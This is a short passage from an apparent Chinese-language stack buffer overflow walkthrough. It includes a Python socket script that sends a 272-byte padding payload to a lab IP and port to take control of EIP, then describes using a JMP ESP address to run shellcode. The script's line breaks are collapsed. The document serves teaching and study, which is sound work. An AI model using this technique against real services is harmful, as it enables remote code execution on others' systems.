#可以发现EIP, ESP寄存器中都被字符A填充，存在缓冲区溢出漏洞


经测试，在覆盖EIP寄存器前需要填充272个字符，BBBB刚好覆盖EIP寄存器，CCCC...覆盖ESP寄存器

import socket payload = 'A' * 272 + 'BBBB' + 'CCCCCCCCCCCCCCCC' + '\x00'
try:    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect(('192.168.31.111', 1985))    s.send(payload.encode())    s.close()except Exception as e:    print(e)print("error")


在调试工具中寻找 JMP ESP 指令的地址，然后将生成好的shellcode放置在EIP地址的后面，EIP寄存器中用 JMP ESP 指令的地址替换，因为ESP寄存器中存放将要执行的二进制代码，如果能够让CPU执行跳转到ESP的指令，那么就能够执行shellcode。
